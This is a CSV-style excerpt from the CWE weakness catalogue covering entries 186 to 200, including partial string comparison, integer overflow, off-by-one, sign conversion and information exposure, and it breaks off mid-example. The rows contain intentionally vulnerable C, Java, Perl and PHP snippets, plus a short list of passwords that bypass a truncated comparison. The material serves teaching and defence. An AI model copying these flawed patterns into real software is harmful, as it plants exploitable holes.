CWE-186: Overly Restrictive Regular Expression,"A regular expression is overly restrictive, which prevents dangerous values from being detected.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ",无示范例子,"Phase:  ImplementationRegular expressions can become error prone when defining a complex language even for those experienced in writing grammars. Determine if several smaller regular expressions simplify one large regular expression. Also, subject your regular expression to thorough testing techniques such as equivalence partitioning, boundary value analysis, and robustness. After testing and a reasonable confidence level is achieved, a regular expression may not be foolproof. If an exploit is allowed to slip through, then record the exploit and refactor your regular expression."
CWE-187: Partial String Comparison,"The product performs a comparison that only examines a portion of a factor before determining whether there is a match, such as a substring, leading to resultant weaknesses.","Scope: IntegrityAccess Control, Impact: Technical Impact:Alter Execution Logic; Bypass Protection Mechanism, Likelihood: ","Example 1This example defines a fixed username and password. The AuthenticateUser() function is intended to accept a username and a password from an untrusted user, and check to ensure that it matches the username and password. If the username and password match, AuthenticateUser() is intended to indicate that authentication succeeded.(bad code)Example Language:C/* IgnoreCWE-259(hard-coded password) andCWE-309(use of password system for authentication) for this example. */char *username = ""admin"";char *pass = ""password"";int AuthenticateUser(char *inUser, char *inPass) {if (strncmp(username, inUser, strlen(inUser))) {logEvent(""Auth failure of username using strlen of inUser"");return(AUTH_FAIL);}if (! strncmp(pass, inPass, strlen(inPass))) {logEvent(""Auth success of password using strlen of inUser"");return(AUTH_SUCCESS);}else {logEvent(""Auth fail of password using sizeof"");return(AUTH_FAIL);}}int main (int argc, char **argv) {int authResult;if (argc < 3) {ExitError(""Usage: Provide a username and password"");}authResult = AuthenticateUser(argv[1], argv[2]);if (authResult == AUTH_SUCCESS) {DoAuthenticatedTask(argv[1]);}else {ExitError(""Authentication failed"");}}In AuthenticateUser(), the strncmp() call uses the string length of an attacker-provided inPass parameter in order to determine how many characters to check in the password. So, if the attacker only provides a password of length 1, the check will only examine the first byte of the application's password before determining success.As a result, this partial comparison leads to improper authentication (CWE-287).Any of these passwords would still cause authentication to succeed for the ""admin"" user:(attack code)ppapaspassThis significantly reduces the search space for an attacker, making brute force attacks more feasible.The same problem also applies to the username, so values such as ""a"" and ""adm"" will succeed for the username.While this demonstrative example may not seem realistic, see the Observed Examples for CVE entries that effectively reflect this same weakness.",Phase:  TestingThoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing.
CWE-188: Reliance on Data/Memory Layout,"The product makes invalid assumptions about how protocol data or memory is organized at a lower level, resulting in unintended program behavior.","Scope: IntegrityConfidentiality, Impact: Technical Impact:Modify Memory; Read MemoryCan result in unintended modifications or exposure of sensitive memory., Likelihood: ","Example 1In this example function, the memory address of variable b is derived by adding 1 to the address of variable a. This derived address is then used to assign the value 0 to b.(bad code)Example Language:Cvoid example() {char a;char b;*(&a + 1) = 0;}Here, b may not be one byte past a. It may be one byte in front of a. Or, they may have three bytes between them because they are aligned on 32-bit boundaries.","Phases:  Implementation; Architecture and DesignIn flat address space situations, never allow computing memory addresses as offsets from another memory address.Phase:  Architecture and DesignFully specify protocol layout unambiguously, providing a structured grammar (e.g., a compilable yacc grammar).Phase:  TestingTesting: Test that the implementation properly handles each case in the protocol grammar."
CWE CATEGORY: Numeric Errors,Weaknesses in this category are related to improper calculation or conversion of numbers.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-190: Integer Overflow or Wraparound,"The product performs a calculation that can produce an integer overflow or wraparound, when the logic assumes that the resulting value will always be larger than the original value. This can introduce other weaknesses when the calculation is used for resource management or execution control.","Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or Restart; DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory); DoS: InstabilityThis weakness will generally lead to undefined behavior and therefore crashes. In the case of overflows involving loop index variables, the likelihood of infinite loops is also high., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify MemoryIf the value in question is important to data (as opposed to flow), simple data corruption has occurred. Also, if the wrap around results in other conditions such as buffer overflows, further memory corruption may occur., Likelihood: ; Scope: ConfidentialityAvailabilityAccess Control, Impact: Technical Impact:Execute Unauthorized Code or Commands; Bypass Protection MechanismThis weakness can sometimes trigger buffer overflows which can be used to execute arbitrary code. This is usually outside the scope of a program's implicit security policy., Likelihood: ","Example 1The following image processing code allocates a table for images.(bad code)Example Language:Cimg_t table_ptr; /*struct containing img data, 10kB each*/int num_imgs;...num_imgs = get_num_imgs();table_ptr = (img_t*)malloc(sizeof(img_t)*num_imgs);...This code intends to allocate a table of size num_imgs, however as num_imgs grows large, the calculation determining the size of the list will eventually overflow (CWE-190). This will result in a very small list to be allocated instead. If the subsequent code operates on the list as if it were num_imgs long, it may result in many types of out-of-bounds problems (CWE-119).Example 2The following code excerpt from OpenSSH 3.3 demonstrates a classic case of integer overflow:(bad code)Example Language:Cnresp = packet_get_int();if (nresp > 0) {response = xmalloc(nresp*sizeof(char*));for (i = 0; i < nresp; i++) response[i] = packet_get_string(NULL);}If nresp has the value 1073741824 and sizeof(char*) has its typical value of 4, then the result of the operation nresp*sizeof(char*) overflows, and the argument to xmalloc() will be 0. Most malloc() implementations will happily allocate a 0-byte buffer, causing the subsequent loop iterations to overflow the heap buffer response.Example 3Integer overflows can be complicated and difficult to detect. The following example is an attempt to show how an integer overflow may lead to undefined looping behavior:(bad code)Example Language:Cshort int bytesRec = 0;char buf[SOMEBIGNUM];while(bytesRec < MAXGET) {bytesRec += getFromInput(buf+bytesRec);}In the above case, it is entirely possible that bytesRec may overflow, continuously creating a lower number than MAXGET and also overwriting the first MAXGET-1 bytes of buf.Example 4In this example the method determineFirstQuarterRevenue is used to determine the first quarter revenue for an accounting/business application. The method retrieves the monthly sales totals for the first three months of the year, calculates the first quarter sales totals from the monthly sales totals, calculates the first quarter revenue based on the first quarter sales, and finally saves the first quarter revenue results to the database.(bad code)Example Language:C#define JAN 1#define FEB 2#define MAR 3short getMonthlySales(int month) {...}float calculateRevenueForQuarter(short quarterSold) {...}int determineFirstQuarterRevenue() {// Variable for sales revenue for the quarterfloat quarterRevenue = 0.0f;short JanSold = getMonthlySales(JAN); /* Get sales in January */short FebSold = getMonthlySales(FEB); /* Get sales in February */short MarSold = getMonthlySales(MAR); /* Get sales in March */// Calculate quarterly totalshort quarterSold = JanSold + FebSold + MarSold;// Calculate the total revenue for the quarterquarterRevenue = calculateRevenueForQuarter(quarterSold);saveFirstQuarterRevenue(quarterRevenue);return 0;}However, in this example the primitive type short int is used for both the monthly and the quarterly sales variables. In C the short int primitive type has a maximum value of 32768. This creates a potential integer overflow if the value for the three monthly sales adds up to more than the maximum value for the short int primitive type. An integer overflow can lead to data corruption, unexpected behavior, infinite loops and system crashes. To correct the situation the appropriate primitive type should be used, as in the example below, and/or provide some validation mechanism to ensure that the maximum value for the primitive type is not exceeded.(good code)Example Language:C...float calculateRevenueForQuarter(long quarterSold) {...}int determineFirstQuarterRevenue() {...// Calculate quarterly totallong quarterSold = JanSold + FebSold + MarSold;// Calculate the total revenue for the quarterquarterRevenue = calculateRevenueForQuarter(quarterSold);...}Note that an integer overflow could also occur if the quarterSold variable has a primitive type long but the method calculateRevenueForQuarter has a parameter of type short.","Phase:  RequirementsEnsure that all protocols are strictly defined, such that all out-of-bounds behavior can be identified simply, and require strict conformance to the protocol.Phase:  RequirementsStrategy:  Language SelectionUse a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.If possible, choose a language or compiler that performs automatic bounds checking.Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.Use libraries or frameworks that make it easier to handle numbers without unexpected consequences.Examples include safe integer handling packages such as SafeInt (C++) or IntegerLib (C or C++). [REF-106]Phase:  ImplementationStrategy:  Input ValidationPerform input validation on any numeric input by ensuring that it is within the expected range. Enforce that the input meets both the minimum and maximum requirements for the expected range.Use unsigned integers where possible. This makes it easier to perform validation for integer overflows. When signed integers are required, ensure that the range check includes minimum values as well as maximum values.Phase:  ImplementationUnderstand the programming language's underlying representation and how it interacts with numeric calculation (CWE-681). Pay close attention to byte size discrepancies, precision, signed/unsigned distinctions, truncation, conversion and casting between types, ""not-a-number"" calculations, and how the language handles numbers that are too large or too small for its underlying representation. [REF-7]Also be careful to account for 32-bit, 64-bit, and other potential differences that may affect the numeric representation.Phase:  Architecture and DesignFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoidCWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.Phase:  ImplementationStrategy:  Compilation or Build HardeningExamine compiler warnings closely and eliminate problems with potential security implications, such as signed / unsigned mismatch in memory operations, or use of uninitialized variables. Even if the weakness is rarely exploitable, a single failure may lead to the compromise of the entire system."
CWE-191: Integer Underflow (Wrap or Wraparound),"The product subtracts one value from another, such that the result is less than the minimum allowable integer value, which produces a value that is not equal to the correct result.","Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or Restart; DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory); DoS: InstabilityThis weakness will generally lead to undefined behavior and therefore crashes. In the case of overflows involving loop index variables, the likelihood of infinite loops is also high., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify MemoryIf the value in question is important to data (as opposed to flow), simple data corruption has occurred. Also, if the wrap around results in other conditions such as buffer overflows, further memory corruption may occur., Likelihood: ; Scope: ConfidentialityAvailabilityAccess Control, Impact: Technical Impact:Execute Unauthorized Code or Commands; Bypass Protection MechanismThis weakness can sometimes trigger buffer overflows which can be used to execute arbitrary code. This is usually outside the scope of a program's implicit security policy., Likelihood: ","Example 1The following example subtracts from a 32 bit signed integer.(bad code)Example Language:C#include <stdio.h>#include <stdbool.h>main (void){int i;i = -2147483648;i = i - 1;return 0;}The example has an integer underflow. The value of i is already at the lowest negative value possible, so after subtracting 1, the new value of i is 2147483647.Example 2This code performs a stack allocation based on a length calculation.(bad code)Example Language:Cint a = 5, b = 6;size_t len = a - b;char buf[len];    // Just blows up the stack}Since a and b are declared as signed ints, the ""a - b"" subtraction gives a negative result (-1). However, since len is declared to be unsigned, len is cast to an extremely large positive number (on 32-bit systems - 4294967295). As a result, the buffer buf[len] declaration uses an extremely large size to allocate on the stack, very likely more than the entire computer's memory space.Miscalculations usually will not be so obvious. The calculation will either be complicated or the result of an attacker's input to attain the negative value.",无可能的缓解方案
CWE-192: Integer Coercion Error,"Integer coercion refers to a set of flaws pertaining to the type casting, extension, or truncation of primitive data types.","Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory); DoS: Crash, Exit, or RestartInteger coercion often leads to undefined states of execution resulting in infinite loops or crashes., Likelihood: ; Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or CommandsIn some cases, integer coercion errors can lead to exploitable buffer overflow conditions, resulting in the execution of arbitrary code., Likelihood: ; Scope: IntegrityOther, Impact: Technical Impact:OtherInteger coercion errors result in an incorrect value being stored for the variable in question., Likelihood: ","Example 1The following code is intended to read an incoming packet from a socket and extract one or more headers.(bad code)Example Language:CDataPacket *packet;int numHeaders;PacketHeader *headers;sock=AcceptSocketConnection();ReadPacket(packet, sock);numHeaders =packet->headers;if (numHeaders > 100) {ExitError(""too many headers!"");}headers = malloc(numHeaders * sizeof(PacketHeader);ParsePacketHeaders(packet, headers);The code performs a check to make sure that the packet does not contain too many headers. However, numHeaders is defined as a signed int, so it could be negative. If the incoming packet specifies a value such as -3, then the malloc calculation will generate a negative number (say, -300 if each header can be a maximum of 100 bytes). When this result is provided to malloc(), it is first converted to a size_t type. This conversion then produces a large value such as 4294966996, which may cause malloc() to fail or to allocate an extremely large amount of memory (CWE-195). With the appropriate negative numbers, an attacker could trick malloc() into using a very small positive number, which then allocates a buffer that is much smaller than expected, potentially leading to a buffer overflow.Example 2The following code reads a maximum size and performs validation on that size. It then performs a strncpy, assuming it will not exceed the boundaries of the array. While the use of ""short s"" is forced in this particular example, short int's are frequently used within real-world code, such as code that processes structured data.(bad code)Example Language:Cint GetUntrustedInt () {return(0x0000FFFF);}void main (int argc, char **argv) {char path[256];char *input;int i;short s;unsigned int sz;i = GetUntrustedInt();s = i;/* s is -1 so it passes the safety check -CWE-697*/if (s > 256) {DiePainfully(""go away!\n"");}/* s is sign-extended and saved in sz */sz = s;/* output: i=65535, s=-1, sz=4294967295 - your mileage may vary */printf(""i=%d, s=%d, sz=%u\n"", i, s, sz);input = GetUserInput(""Enter pathname:"");/* strncpy interprets s as unsigned int, so it's treated as MAX_INT(CWE-195), enabling buffer overflow (CWE-119) */strncpy(path, input, s);path[255] = '\0'; /* don't wantCWE-170*/printf(""Path is: %s\n"", path);}This code first exhibits an example ofCWE-839, allowing ""s"" to be a negative number. When the negative short ""s"" is converted to an unsigned integer, it becomes an extremely large positive integer. When this converted integer is used by strncpy() it will lead to a buffer overflow (CWE-119).",Phase:  RequirementsA language which throws exceptions on ambiguous data casts might be chosen.Phase:  Architecture and DesignDesign objects and program flow such that multiple or complex casts are unnecessaryPhase:  ImplementationEnsure that any data type casting that you must used is entirely understood in order to reduce the plausibility of error in use.
CWE-193: Off-by-one Error,"A product calculates or uses an incorrect maximum or minimum value that is 1 more, or 1 less, than the correct value.","Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or Restart; DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory); DoS: InstabilityThis weakness will generally lead to undefined behavior and therefore crashes. In the case of overflows involving loop index variables, the likelihood of infinite loops is also high., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify MemoryIf the value in question is important to data (as opposed to flow), simple data corruption has occurred. Also, if the wrap around results in other conditions such as buffer overflows, further memory corruption may occur., Likelihood: ; Scope: ConfidentialityAvailabilityAccess Control, Impact: Technical Impact:Execute Unauthorized Code or Commands; Bypass Protection MechanismThis weakness can sometimes trigger buffer overflows which can be used to execute arbitrary code. This is usually outside the scope of a program's implicit security policy., Likelihood: ","Example 1The following code allocates memory for a maximum number of widgets. It then gets a user-specified number of widgets, making sure that the user does not request too many. It then initializes the elements of the array using InitializeWidget(). Because the number of widgets can vary for each request, the code inserts a NULL pointer to signify the location of the last widget.(bad code)Example Language:Cint i;unsigned int numWidgets;Widget **WidgetList;numWidgets = GetUntrustedSizeValue();if ((numWidgets == 0) || (numWidgets > MAX_NUM_WIDGETS)) {ExitError(""Incorrect number of widgets requested!"");}WidgetList = (Widget **)malloc(numWidgets * sizeof(Widget *));printf(""WidgetList ptr=%p\n"", WidgetList);for(i=0; i<numWidgets; i++) {WidgetList[i] = InitializeWidget();}WidgetList[numWidgets] = NULL;showWidgets(WidgetList);However, this code contains an off-by-one calculation error (CWE-193). It allocates exactly enough space to contain the specified number of widgets, but it does not include the space for the NULL pointer. As a result, the allocated buffer is smaller than it is supposed to be (CWE-131). So if the user ever requests MAX_NUM_WIDGETS, there is an out-of-bounds write (CWE-787) when the NULL is assigned. Depending on the environment and compilation settings, this could cause memory corruption.Example 2In this example, the code does not account for the terminating null character, and it writes one byte beyond the end of the buffer.The first call to strncat() appends up to 20 characters plus a terminating null character to fullname[]. There is plenty of allocated space for this, and there is no weakness associated with this first call. However, the second call to strncat() potentially appends another 20 characters. The code does not account for the terminating null character that is automatically added by strncat(). This terminating null character would be written one byte beyond the end of the fullname[] buffer. Therefore an off-by-one error exists with the second strncat() call, as the third argument should be 19.(bad code)Example Language:Cchar firstname[20];char lastname[20];char fullname[40];fullname[0] = '\0';strncat(fullname, firstname, 20);strncat(fullname, lastname, 20);When using a function like strncat() one must leave a free byte at the end of the buffer for a terminating null character, thus avoiding the off-by-one weakness. Additionally, the last argument to strncat() is the number of characters to append, which must be less than the remaining space in the buffer. Be careful not to just use the total size of the buffer.(good code)Example Language:Cchar firstname[20];char lastname[20];char fullname[40];fullname[0] = '\0';strncat(fullname, firstname, sizeof(fullname)-strlen(fullname)-1);strncat(fullname, lastname, sizeof(fullname)-strlen(fullname)-1);Example 3The Off-by-one error can also be manifested when reading characters from a character array within a for loop that has an incorrect continuation condition.(bad code)Example Language:C#define PATH_SIZE 60char filename[PATH_SIZE];for(i=0; i<=PATH_SIZE; i++) {char c = getc();if (c == 'EOF') {filename[i] = '\0';}filename[i] = getc();}In this case, the correct continuation condition is shown below.(good code)Example Language:Cfor(i=0; i<PATH_SIZE; i++) {...Example 4As another example the Off-by-one error can occur when using the sprintf library function to copy a string variable to a formatted string variable and the original string variable comes from an untrusted source. As in the following example where a local function, setFilename is used to store the value of a filename to a database but first uses sprintf to format the filename. The setFilename function includes an input parameter with the name of the file that is used as the copy source in the sprintf function. The sprintf function will copy the file name to a char array of size 20 and specifies the format of the new variable as 16 characters followed by the file extension .dat.(bad code)Example Language:Cint setFilename(char *filename) {char name[20];sprintf(name, ""%16s.dat"", filename);int success = saveFormattedFilenameToDB(name);return success;}However this will cause an Off-by-one error if the original filename is exactly 16 characters or larger because the format of 16 characters with the file extension is exactly 20 characters and does not take into account the required null terminator that will be placed at the end of the string.","Phase:  ImplementationWhen copying character arrays or using character manipulation methods, the correct size parameter must be used to account for the null terminator that needs to be added at the end of the array. Some examples of functions susceptible to this weakness in C include strcpy(), strncpy(), strcat(), strncat(), printf(), sprintf(), scanf() and sscanf()."
CWE-194: Unexpected Sign Extension,"The product performs an operation on a number that causes it to be sign extended when it is transformed into a larger data type. When the original number is negative, this can produce unexpected values that lead to resultant weaknesses.","Scope: IntegrityConfidentialityAvailabilityOther, Impact: Technical Impact:Read Memory; Modify Memory; OtherWhen an unexpected sign extension occurs in code that operates directly on memory buffers, such as a size value or a memory index, then it could cause the program to write or read outside the boundaries of the intended buffer. If the numeric value is associated with an application-level resource, such as a quantity or price for a product in an e-commerce site, then the sign extension could produce a value that is much higher (or lower) than the application's allowable range., Likelihood: ","Example 1The following code reads a maximum size and performs a sanity check on that size. It then performs a strncpy, assuming it will not exceed the boundaries of the array. While the use of ""short s"" is forced in this particular example, short int's are frequently used within real-world code, such as code that processes structured data.(bad code)Example Language:Cint GetUntrustedInt () {return(0x0000FFFF);}void main (int argc, char **argv) {char path[256];char *input;int i;short s;unsigned int sz;i = GetUntrustedInt();s = i;/* s is -1 so it passes the safety check -CWE-697*/if (s > 256) {DiePainfully(""go away!\n"");}/* s is sign-extended and saved in sz */sz = s;/* output: i=65535, s=-1, sz=4294967295 - your mileage may vary */printf(""i=%d, s=%d, sz=%u\n"", i, s, sz);input = GetUserInput(""Enter pathname:"");/* strncpy interprets s as unsigned int, so it's treated as MAX_INT(CWE-195), enabling buffer overflow (CWE-119) */strncpy(path, input, s);path[255] = '\0'; /* don't wantCWE-170*/printf(""Path is: %s\n"", path);}This code first exhibits an example ofCWE-839, allowing ""s"" to be a negative number. When the negative short ""s"" is converted to an unsigned integer, it becomes an extremely large positive integer. When this converted integer is used by strncpy() it will lead to a buffer overflow (CWE-119).","Phase:  ImplementationAvoid using signed variables if you don't need to represent negative values. When negative values are needed, perform validation after you save those values to larger data types, or before passing them to functions that are expecting unsigned values."
CWE-195: Signed to Unsigned Conversion Error,"The product uses a signed primitive and performs a cast to an unsigned primitive, which can produce an unexpected value if the value of the signed primitive can not be represented using an unsigned primitive.","Scope: Integrity, Impact: Technical Impact:Unexpected StateConversion between signed and unsigned values can lead to a variety of errors, but from a security standpoint is most commonly associated with integer overflow and buffer overflow vulnerabilities., Likelihood: ","Example 1In this example the variable amount can hold a negative value when it is returned. Because the function is declared to return an unsigned int, amount will be implicitly converted to unsigned.(bad code)Example Language:Cunsigned int readdata () {int amount = 0;...if (result == ERROR)amount = -1;...return amount;}If the error condition in the code above is met, then the return value of readdata() will be 4,294,967,295 on a system that uses 32-bit integers.Example 2In this example, depending on the return value of accecssmainframe(), the variable amount can hold a negative value when it is returned. Because the function is declared to return an unsigned value, amount will be implicitly cast to an unsigned number.(bad code)Example Language:Cunsigned int readdata () {int amount = 0;...amount = accessmainframe();...return amount;}If the return value of accessmainframe() is -1, then the return value of readdata() will be 4,294,967,295 on a system that uses 32-bit integers.Example 3The following code is intended to read an incoming packet from a socket and extract one or more headers.(bad code)Example Language:CDataPacket *packet;int numHeaders;PacketHeader *headers;sock=AcceptSocketConnection();ReadPacket(packet, sock);numHeaders =packet->headers;if (numHeaders > 100) {ExitError(""too many headers!"");}headers = malloc(numHeaders * sizeof(PacketHeader);ParsePacketHeaders(packet, headers);The code performs a check to make sure that the packet does not contain too many headers. However, numHeaders is defined as a signed int, so it could be negative. If the incoming packet specifies a value such as -3, then the malloc calculation will generate a negative number (say, -300 if each header can be a maximum of 100 bytes). When this result is provided to malloc(), it is first converted to a size_t type. This conversion then produces a large value such as 4294966996, which may cause malloc() to fail or to allocate an extremely large amount of memory (CWE-195). With the appropriate negative numbers, an attacker could trick malloc() into using a very small positive number, which then allocates a buffer that is much smaller than expected, potentially leading to a buffer overflow.Example 4This example processes user input comprised of a series of variable-length structures. The first 2 bytes of input dictate the size of the structure to be processed.(bad code)Example Language:Cchar* processNext(char* strm) {char buf[512];short len = *(short*) strm;strm += sizeof(len);if (len <= 512) {memcpy(buf, strm, len);process(buf);return strm + len;}else {return -1;}}The programmer has set an upper bound on the structure size: if it is larger than 512, the input will not be processed. The problem is that len is a signed short, so the check against the maximum structure length is done with signed values, but len is converted to an unsigned integer for the call to memcpy() and the negative bit will be extended to result in a huge value for the unsigned integer. If len is negative, then it will appear that the structure has an appropriate size (the if branch will be taken), but the amount of memory copied by memcpy() will be quite large, and the attacker will be able to overflow the stack with data in strm.Example 5In the following example, it is possible to request that memcpy move a much larger segment of memory than assumed:(bad code)Example Language:Cint returnChunkSize(void *) {/* if chunk info is valid, return the size of usable memory,* else, return -1 to indicate an error*/...}int main() {...memcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1));...}If returnChunkSize() happens to encounter an error it will return -1. Notice that the return value is not checked before the memcpy operation (CWE-252), so -1 can be passed as the size argument to memcpy() (CWE-805). Because memcpy() assumes that the value is unsigned, it will be interpreted as MAXINT-1 (CWE-195), and therefore will copy far more memory than is likely available to the destination buffer (CWE-787,CWE-788).Example 6This example shows a typical attempt to parse a string with an error resulting from a difference in assumptions between the caller to a function and the function's action.(bad code)Example Language:Cint proc_msg(char *s, int msg_len){// Note space at the end of the string - assume all strings have preamble with spaceint pre_len = sizeof(""preamble: "");char buf[pre_len - msg_len];... Do processing here if we get this far}char *s = ""preamble: message\n"";char *sl = strchr(s, ':');        // Number of characters up to ':' (not including space)int jnklen = sl == NULL ? 0 : sl - s;    // If undefined pointer, use zero lengthint ret_val = proc_msg (""s"",  jnklen);    // Violate assumption of preamble length, end up with negative value, blow out stackThe buffer length ends up being -1, resulting in a blown out stack. The space character after the colon is included in the function calculation, but not in the caller's calculation. This, unfortunately, is not usually so obvious but exists in an obtuse series of calculations.",无可能的缓解方案
CWE-196: Unsigned to Signed Conversion Error,"The product uses an unsigned primitive and performs a cast to a signed primitive, which can produce an unexpected value if the value of the unsigned primitive can not be represented using a signed primitive.","Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartIncorrect sign conversions generally lead to undefined behavior, and therefore crashes., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify MemoryIf a poor cast lead to a buffer overflow or similar condition, data integrity may be affected., Likelihood: ; Scope: IntegrityConfidentialityAvailabilityAccess Control, Impact: Technical Impact:Execute Unauthorized Code or Commands; Bypass Protection MechanismImproper signed-to-unsigned conversions without proper checking can sometimes trigger buffer overflows which can be used to execute arbitrary code. This is usually outside the scope of a program's implicit security policy., Likelihood: ",无示范例子,"Phase:  RequirementsChoose a language which is not subject to these casting flaws.Phase:  Architecture and DesignDesign object accessor functions to implicitly check values for valid sizes. Ensure that all functions which will be used as a size are checked previous to use as a size. If the language permits, throw exceptions rather than using in-band errors.Phase:  ImplementationError check the return values of all functions. Be aware of implicit casts made, and use unsigned variables for sizes if at all possible."
CWE-197: Numeric Truncation Error,Truncation errors occur when a primitive is cast to a primitive of a smaller size and data is lost in the conversion.,"Scope: Integrity, Impact: Technical Impact:Modify MemoryThe true value of the data is lost and corrupted data is used., Likelihood: ","Example 1This example, while not exploitable, shows the possible mangling of values associated with truncation errors:(bad code)Example Language:Cint intPrimitive;short shortPrimitive;intPrimitive = (int)(~((int)0) ^ (1 << (sizeof(int)*8-1)));shortPrimitive = intPrimitive;printf(""Int MAXINT: %d\nShort MAXINT: %d\n"", intPrimitive, shortPrimitive);The above code, when compiled and run on certain systems, returns the following output:(result)Int MAXINT: 2147483647Short MAXINT: -1This problem may be exploitable when the truncated value is used as an array index, which can happen implicitly when 64-bit values are used as indexes, as they are truncated to 32 bits.Example 2In the following Java example, the method updateSalesForProduct is part of a business application class that updates the sales information for a particular product. The method receives as arguments the product ID and the integer amount sold. The product ID is used to retrieve the total product count from an inventory object which returns the count as an integer. Before calling the method of the sales object to update the sales count the integer values are converted to The primitive type short since the method requires short type for the method arguments.(bad code)Example Language:Java...// update sales database for number of product sold with product IDpublic void updateSalesForProduct(String productID, int amountSold) {// get the total number of products in inventory databaseint productCount = inventory.getProductCount(productID);// convert integer values to short, the method for the// sales object requires the parameters to be of type shortshort count = (short) productCount;short sold = (short) amountSold;// update sales database for productsales.updateSalesCount(productID, count, sold);}...However, a numeric truncation error can occur if the integer values are higher than the maximum value allowed for the primitive type short. This can cause unexpected results or loss or corruption of data. In this case the sales database may be corrupted with incorrect data. Explicit casting from a from a larger size primitive type to a smaller size primitive type should be prevented. The following example an if statement is added to validate that the integer values less than the maximum value for the primitive type short before the explicit cast and the call to the sales method.(good code)Example Language:Java...// update sales database for number of product sold with product IDpublic void updateSalesForProduct(String productID, int amountSold) {// get the total number of products in inventory databaseint productCount = inventory.getProductCount(productID);// make sure that integer numbers are not greater than// maximum value for type short before convertingif ((productCount < Short.MAX_VALUE) && (amountSold < Short.MAX_VALUE)) {// convert integer values to short, the method for the// sales object requires the parameters to be of type shortshort count = (short) productCount;short sold = (short) amountSold;// update sales database for productsales.updateSalesCount(productID, count, sold);else {// throw exception or perform other processing...}}...","Phase:  ImplementationEnsure that no casts, implicit or explicit, take place that move from a larger size primitive or a smaller size primitive."
CWE-198: Use of Incorrect Byte Ordering,"The product receives input from an upstream component, but it does not account for byte ordering (e.g. big-endian and little-endian) when processing the input, causing an incorrect number or value to be used.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,无可能的缓解方案
CWE CATEGORY: Information Management Errors,Weaknesses in this category are related to improper handling of sensitive information.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-200: Exposure of Sensitive Information to an Unauthorized Actor,The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information.,"Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ","Example 1The following code checks validity of the supplied username and password and notifies the user of a successful or failed login.(bad code)Example Language:Perlmy $username=param('username');my $password=param('password');if (IsValidUsername($username) == 1){if (IsValidPassword($username, $password) == 1){print ""Login Successful"";}else{print ""Login Failed - incorrect password"";}}else{print ""Login Failed - unknown username"";}In the above code, there are different messages for when an incorrect username is supplied, versus when the username is correct but the password is wrong. This difference enables a potential attacker to understand the state of the login function, and could allow an attacker to discover a valid username by trying different values until the incorrect password message is returned. In essence, this makes it easier for an attacker to obtain half of the necessary authentication credentials.While this type of information may be helpful to a user, it is also useful to a potential attacker. In the above example, the message for both failed cases should be the same, such as:(result)""Login Failed - incorrect username or password""Example 2This code tries to open a database connection, and prints any exceptions that occur.(bad code)Example Language:PHPtry {openDbConnection();}//print exception message that includes exception message and configuration file locationcatch (Exception $e) {echo 'Caught exception: ', $e->getMessage(), '\n';echo 'Check credentials in config file at: ', $Mysql_config_location, '\n';}If an exception occurs, the printed message exposes the location of the configuration file the script is using. An attacker can use this information to target the configuration file (perhaps exploiting a Path Traversal weakness). If the file can be read, the attacker could gain credentials for accessing the database. The attacker may also be able to replace the file with a malicious one, causing the application to use an arbitrary database.Example 3In the example below, the method getUserBankAccount retrieves a bank account object from a database using the supplied username and account number to query the database. If an SQLException is raised when querying the database, an error message is created and output to a log file.(bad code)Example Language:Javapublic BankAccount getUserBankAccount(String username, String accountNumber) {BankAccount userAccount = null;String query = null;try {if (isAuthorizedUser(username)) {query = ""SELECT * FROM accounts WHERE owner = ""+ username + "" AND accountID = "" + accountNumber;DatabaseManager dbManager = new DatabaseManager();Connection conn = dbManager.getConnection();Statement stmt = conn.createStatement();ResultSet queryResult = stmt.executeQuery(query);userAccount = (BankAccount)queryResult.getObject(accountNumber);}} catch (SQLException ex) {String logMessage = ""Unable to retrieve account information from database,\nquery: "" + query;Logger.getLogger(BankManager.class.getName()).log(Level.SEVERE, logMessage, ex);}return userAccount;}The error message that is created includes information about the database query that may contain sensitive information about the database or query logic. In this case, the error message will expose the table name and column names used in the database. This data could be used to simplify other attacks, such as SQL injection (CWE-89) to directly access the database.Example 4This code stores location information about the current user:(bad code)Example Language:JavalocationClient = new LocationClient(this, this, this);locationClient.connect();currentUser.setLocation(locationClient.getLastLocation());...catch (Exception e) {AlertDialog.Builder builder = new AlertDialog.Builder(this);builder.setMessage(""Sorry, this application has experienced an error."");AlertDialog alert = builder.create();alert.show();Log.e(""ExampleActivity"", ""Caught exception: "" + e + "" While on User:"" + User.toString());}When the application encounters an exception it will write the user object to the log. Because the user object contains location information, the user's location is also written to the log.Example 5The following is an actual MySQL error statement:(result)Example Language:SQLWarning: mysql_pconnect(): Access denied for user: 'root@localhost' (Using password: N1nj4) in /usr/local/www/wi-data/includes/database.inc on line 4The error clearly exposes the database credentials.Example 6This code displays some information on a web page.(bad code)Example Language:JSPSocial Security Number: <%= ssn %></br>Credit Card Number: <%= ccn %>The code displays a user's credit card and social security numbers, even though they aren't absolutely necessary.Example 7The following program changes its behavior based on a debug flag.(bad code)Example Language:JSP<% if (Boolean.getBoolean(""debugEnabled"")) 